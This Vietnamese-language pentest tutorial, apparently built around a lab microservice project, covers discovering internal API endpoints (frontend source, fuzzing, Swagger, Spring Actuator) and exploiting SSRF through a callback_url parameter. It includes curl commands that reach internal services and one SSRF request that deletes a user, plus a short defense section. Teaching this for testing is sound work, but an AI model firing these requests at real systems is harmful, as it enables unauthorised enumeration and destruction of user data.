# 🔍 **BURP SUITE - PHÁT HIỆN VÀ KHAI THÁC INTERNAL SERVICES**

## 🎯 **VẤN ĐỀ:**

**Tình huống:** Bạn dùng Burp Suite intercept requests và phát hiện:
```http
GET /api/inventory/1/M?callback_url=http://user-service:8081/... HTTP/1.1
```

**Câu hỏi:**
1. Làm sao biết `user-service:8081` có những endpoints nào?
2. Làm sao biết có endpoint `/api/users/delete/{id}` để xóa user?
3. Làm sao truy cập được internal service từ bên ngoài để xem admin panel?

---

## 📚 **LÝ THUYẾT: INTERNAL vs EXTERNAL SERVICES**

### **Kiến trúc microservice thông thường:**

```
┌─────────────────────────────────────────────┐
│         PUBLIC INTERNET (Bạn ở đây)        │
└────────────────────┬────────────────────────┘
                     │
                     ▼
          ┌──────────────────┐
          │   Load Balancer  │
          │   (Public IP)    │
          └────────┬─────────┘
                   │
        ┌──────────┴──────────┐
        │                     │
        ▼                     ▼
   ┌─────────┐          ┌─────────┐
   │Frontend │          │API Gateway│
   │ :3000   │          │  :443    │
   └────┬────┘          └────┬─────┘
        │                    │
        └─────────┬──────────┘
                  │
    ┌─────────────┴─────────────────┐
    │  PRIVATE NETWORK (172.18.0.0) │
    │                                │
    │  ┌──────────┐  ┌──────────┐  │
    │  │User Svc  │  │Product   │  │
    │  │172.18.0.3│  │172.18.0.5│  │
    │  │  :8081   │  │  :8082   │  │
    │  └──────────┘  └──────────┘  │
    │                                │
    │  ┌──────────┐  ┌──────────┐  │
    │  │Inventory │  │Database  │  │
    │  │172.18.0.4│  │172.18.0.2│  │
    │  │  :8083   │  │  :5432   │  │
    │  └──────────┘  └──────────┘  │
    └────────────────────────────────┘
```

**Key Points:**
- ✅ Frontend (3000) - PUBLIC, bạn truy cập được
- ❌ User Service (8081) - INTERNAL, bạn KHÔNG truy cập được trực tiếp
- ❌ Database (5432) - INTERNAL, bạn KHÔNG truy cập được
- ✅ API Gateway - PUBLIC, có thể truy cập

---

## 🔍 **PHƯƠNG PHÁP 1: PHÂN TÍCH FRONTEND CODE**

### **Tại sao hiệu quả?**
Frontend (React/Angular/Vue) thường **gọi trực tiếp đến internal services qua API Gateway**, và code JavaScript có thể xem được!

### **Bước thực hiện:**

#### **1. Mở DevTools và xem Network Tab**

```javascript
// Truy cập https://yourapp.com
// F12 → Network Tab → Filter: XHR/Fetch

// Bạn sẽ thấy các requests:
GET https://yourapp.com/api/products/
GET https://yourapp.com/api/users
GET https://yourapp.com/api/inventory/1/M
```

#### **2. Xem Source Code của Frontend**

```javascript
// F12 → Sources Tab → webpack://src/

// Tìm file như:
// - services/api.js
// - services/userService.js
// - config/endpoints.js
```

**Ví dụ trong dự án này:**

```javascript
// src/services/api.js
const BASE_URL = 'http://localhost:8081';

export const deleteUser = async (userId) => {
  const response = await axios.delete(
    `${BASE_URL}/api/users/delete/${userId}`
  );
  return response.data;
};

export const getAllUsers = async () => {
  return axios.get(`${BASE_URL}/api/users`);
};
```

**→ Bạn vừa phát hiện endpoint `/api/users/delete/{id}`!** 🎯

#### **3. Dùng Burp Suite Proxy để capture**

**Setup:**
1. Burp Suite → Proxy → Intercept is on
2. Browser → Proxy settings → 127.0.0.1:8080
3. Browse website

**Kết quả:**
```http
GET /api/users HTTP/1.1
Host: yourapp.com
Authorization: Bearer eyJhbGc...

DELETE /api/users/delete/5 HTTP/1.1
Host: yourapp.com
Authorization: Bearer eyJhbGc...
```

**→ Phát hiện cả endpoints và authentication method!**

---

## 🔍 **PHƯƠNG PHÁP 2: ENDPOINT ENUMERATION (FUZZING)**

### **Khi không có source code, dùng fuzzing!**

#### **Tool: ffuf (Fast Fuzzing)**

```bash
# Download wordlist
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints.txt

# Fuzz API endpoints
ffuf -w api-endpoints.txt \
     -u https://yourapp.com/api/FUZZ \
     -mc 200,201,204,301,302,401,403 \
     -o results.json

# Results:
/api/users           [Status: 200]
/api/users/1         [Status: 200]
/api/products        [Status: 200]
/api/admin           [Status: 403] ← Interesting!
/api/health          [Status: 200]
```

#### **Tool: Arjun (Parameter Discovery)**

```bash
# Install
pip install arjun

# Discover hidden parameters
arjun -u https://yourapp.com/api/inventory/1/M

# Output:
[+] Scanning: https://yourapp.com/api/inventory/1/M
[+] Found parameters:
    - callback_url
    - debug
    - format
```

#### **Tool: Wfuzz**

```bash
# Fuzz HTTP methods on discovered endpoints
wfuzz -w methods.txt \
      -X FUZZ \
      https://yourapp.com/api/users/1

# methods.txt:
GET
POST
PUT
DELETE
PATCH
OPTIONS

# Results:
GET    /api/users/1     [200] - Get user info
DELETE /api/users/1     [403] - Forbidden (needs auth)
DELETE /api/users/delete/1  [200] - VULNERABLE! No auth!
```

---

## 🔍 **PHƯƠNG PHÁP 3: SWAGGER/OPENAPI DOCUMENTATION**

### **Nhiều API có documentation public!**

**Common URLs để test:**

```bash
# Swagger UI
https://yourapp.com/swagger-ui.html
https://yourapp.com/swagger-ui/
https://yourapp.com/api/swagger-ui.html
https://yourapp.com/docs

# OpenAPI JSON
https://yourapp.com/v2/api-docs
https://yourapp.com/v3/api-docs
https://yourapp.com/api/v1/swagger.json
https://yourapp.com/openapi.json

# GraphQL
https://yourapp.com/graphql
https://yourapp.com/graphiql

# API versioning
https://yourapp.com/api/v1/docs
https://yourapp.com/api/v2/docs
```

**Ví dụ response:**

```json
{
  "swagger": "2.0",
  "paths": {
    "/api/users": {
      "get": {
        "summary": "Get all users",
        "security": [{"Bearer": []}]
      }
    },
    "/api/users/delete/{id}": {
      "delete": {
        "summary": "Delete user by ID",
        "security": []  ← NO SECURITY!
      }
    }
  }
}
```

**→ Full API documentation với tất cả endpoints!** 🎉

---

## 🔍 **PHƯƠNG PHÁP 4: SSRF SELF-ENUMERATION**

### **Dùng SSRF để service tự "nói" về chính nó!**

#### **Technique 1: Health/Status Endpoints**

```bash
# Common health check endpoints
curl "https://yourapp.com/api/inventory/1/M?callback_url=http://user-service:8081/health"
curl "https://yourapp.com/api/inventory/1/M?callback_url=http://user-service:8081/actuator/health"
curl "https://yourapp.com/api/inventory/1/M?callback_url=http://user-service:8081/status"
curl "https://yourapp.com/api/inventory/1/M?callback_url=http://user-service:8081/info"

# Response có thể chứa:
{
  "status": "UP",
  "components": {
    "db": {"status": "UP"},
    "userService": {"status": "UP", "version": "1.0.0"}
  }
}
```

#### **Technique 2: Spring Boot Actuator (Java services)**

```bash
# Spring Boot Actuator endpoints
curl "...?callback_url=http://user-service:8081/actuator"

# Response:
{
  "_links": {
    "beans": {"href": "http://user-service:8081/actuator/beans"},
    "env": {"href": "http://user-service:8081/actuator/env"},
    "mappings": {"href": "http://user-service:8081/actuator/mappings"}
  }
}

# Get all endpoint mappings!
curl "...?callback_url=http://user-service:8081/actuator/mappings"

# Response shows ALL endpoints:
{
  "contexts": {
    "application": {
      "mappings": {
        "dispatcherServlets": {
          "dispatcherServlet": [
            {
              "handler": "UserController.getAllUsers()",
              "predicate": "{GET /api/users}"
            },
            {
              "handler": "UserController.deleteUser(Long)",
              "predicate": "{DELETE /api/users/delete/{id}}"
            }
          ]
        }
      }
    }
  }
}
```

**→ Tất cả endpoints được leak qua Actuator!** 🚨

#### **Technique 3: Django Debug Mode**

```bash
# If Django DEBUG=True
curl "...?callback_url=http://product-service:8082/api/invalid-endpoint"

# Response shows full traceback with:
- All installed apps
- All URL patterns
- Database models
- Settings (sometimes with secrets!)
```

#### **Technique 4: Error-Based Information Disclosure**

```bash
# Send invalid requests to trigger errors
curl "...?callback_url=http://user-service:8081/api/users/abc"

# Error response may show:
{
  "error": "Invalid user ID format",
  "path": "/api/users/abc",
  "available_endpoints": [
    "/api/users",
    "/api/users/{id}",
    "/api/users/delete/{id}"
  ]
}
```

---

## 🔍 **PHƯƠNG PHÁP 5: RESPONSE ANALYSIS**

### **Phân tích responses để đoán endpoints**

#### **Pattern Recognition:**

```bash
# Test 1
GET /api/products/1
Response: {"id": 1, "name": "Product A", ...}

# Guess từ pattern:
GET /api/products/delete/1  ← Thử xóa
GET /api/products/edit/1    ← Thử sửa
POST /api/products/         ← Thử tạo

# Test 2
GET /api/users/1
Response: {"id": 1, "username": "admin", ...}

# Apply same pattern:
GET /api/users/delete/1     ← Có thể xóa user!
```

#### **REST API Conventions:**

```bash
# Standard REST patterns
GET    /api/resource          # List all
GET    /api/resource/:id      # Get one
POST   /api/resource          # Create
PUT    /api/resource/:id      # Update (full)
PATCH  /api/resource/:id      # Update (partial)
DELETE /api/resource/:id      # Delete

# Common variations:
DELETE /api/resource/delete/:id
POST   /api/resource/:id/delete
GET    /api/resource/:id/remove
```

---

## 🛠️ **THỰC HÀNH VỚI DỰ ÁN NÀY**

### **Scenario: Tìm endpoint xóa user**

#### **Bước 1: Burp Suite Intercept**

```http
# Browse website → Admin Users page
# Burp captures:

GET /api/users HTTP/1.1
Host: localhost:8081
Authorization: Bearer eyJhbGc...

Response:
[
  {"id": 1, "username": "admin", "email": "admin@example.com"},
  {"id": 2, "username": "user1", "email": "user1@example.com"}
]
```

#### **Bước 2: Xem Frontend Source**

```javascript
// F12 → Sources → src/components/AdminUsers.js

const handleDelete = async (userId) => {
  try {
    // FOUND IT! ↓
    await axios.delete(`http://localhost:8081/api/users/delete/${userId}`);
    fetchUsers();
  } catch (error) {
    console.error('Error deleting user:', error);
  }
};
```

**→ Endpoint: `/api/users/delete/{id}`** ✅

#### **Bước 3: Test trực tiếp (nếu có port exposed)**

```bash
# Trong lab này, port 8081 được expose
curl -X DELETE http://localhost:8081/api/users/delete/5

# Response:
{"message": "User deleted successfully"}

# → Confirmed! Endpoint này KHÔNG cần authentication!
```

#### **Bước 4: Khai thác qua SSRF**

```bash
# Từ public internet
curl "https://yourapp.com/api/inventory/1/M?callback_url=http://user-service:8081/api/users/delete/5"

# Backend sẽ gọi internal service
# User ID 5 bị xóa! 🎯
```

---

## 🎯 **BURP SUITE WORKFLOW**

### **Complete Workflow để tìm và khai thác:**

```
1. INTERCEPT TRAFFIC
   ├─ Proxy → Intercept → Browse site
   ├─ Capture all requests
   └─ Save to Burp Project

2. MAP APPLICATION
   ├─ Target → Site map
   ├─ Spider → Crawl entire site
   └─ Analyze all endpoints

3. DISCOVER PARAMETERS
   ├─ Send request to Intruder
   ├─ Fuzz parameters (callback, url, etc.)
   └─ Analyze responses

4. SSRF DETECTION
   ├─ Burp Collaborator → Copy URL
   ├─ Test: ?callback_url=burp-collab-url
   └─ Check Collaborator for pingbacks

5. ENUMERATE INTERNAL SERVICES
   ├─ Test common IPs (172.18.0.x, 10.0.0.x)
   ├─ Test common ports (8080, 8081, 8082)
   └─ Test health endpoints

6. DISCOVER INTERNAL ENDPOINTS
   ├─ Actuator: /actuator/mappings
   ├─ Swagger: /v2/api-docs
   ├─ Health: /health, /status
   └─ Error responses

7. EXPLOIT
   ├─ Craft SSRF payload
   ├─ Call internal endpoint
   └─ Verify impact (data leak, user delete, etc.)
```

---

## 📊 **CHECKLIST**

### **Tìm Internal Endpoints:**

- [ ] **Frontend Analysis**
  - [ ] Xem DevTools → Network tab
  - [ ] Xem Sources → JavaScript files
  - [ ] Search cho keywords: `api`, `endpoint`, `delete`, `admin`

- [ ] **Documentation**
  - [ ] Test /swagger-ui.html
  - [ ] Test /v2/api-docs
  - [ ] Test /docs, /api-docs
  - [ ] Test /graphql, /graphiql

- [ ] **Fuzzing**
  - [ ] Fuzz endpoint paths với SecLists
  - [ ] Fuzz parameters với Arjun
  - [ ] Fuzz HTTP methods
  - [ ] Test REST conventions

- [ ] **SSRF Self-Enumeration**
  - [ ] Test /actuator/* (Spring Boot)
  - [ ] Test /health, /status
  - [ ] Test /metrics, /info
  - [ ] Trigger error responses

- [ ] **Pattern Recognition**
  - [ ] Analyze existing endpoints
  - [ ] Guess similar patterns
  - [ ] Test CRUD operations
  - [ ] Test admin operations

---

## 💡 **KEY INSIGHTS**

### **Tại sao tìm được internal endpoints trong Black Box?**

1. **Frontend leaks everything**: JavaScript code có tất cả API calls
2. **Documentation often public**: Swagger/OpenAPI thường quên không bảo vệ
3. **Debug mode leaks info**: Error messages expose structure
4. **Actuator endpoints**: Spring Boot Actuator leak toàn bộ mappings
5. **Pattern predictability**: REST APIs follow conventions
6. **SSRF self-enumeration**: Service có thể "nói" về chính nó

### **Red Flags khi testing:**

- ⚠️ Port 8080, 8081, 8082 → Thường là internal services
- ⚠️ Hostname `xxx-service` → Microservice architecture
- ⚠️ `/actuator/*` → Spring Boot với debug endpoints
- ⚠️ `DEBUG=True` → Django development mode
- ⚠️ Swagger UI accessible → Full API documentation
- ⚠️ Error stack traces → Technology stack exposed

---

## 🔒 **DEFENSE**

### **Làm sao để bảo vệ?**

```python
# 1. Disable debug mode
DEBUG = False  # Django
spring.boot.admin.enabled=false  # Spring Boot

# 2. Protect documentation
@app.route('/swagger-ui.html')
@login_required
def swagger():
    pass

# 3. Disable Actuator in production
management.endpoints.enabled-by-default=false

# 4. Network segmentation
# Internal services không nên có port exposed ra internet

# 5. Authentication on ALL endpoints
@app.route('/api/users/delete/<int:id>', methods=['DELETE'])
@token_required  # ← Always require auth!
def delete_user(id):
    pass
```

---

**Đây là cách Black Box Pentester tìm internal endpoints và khai thác SSRF!** 🎯
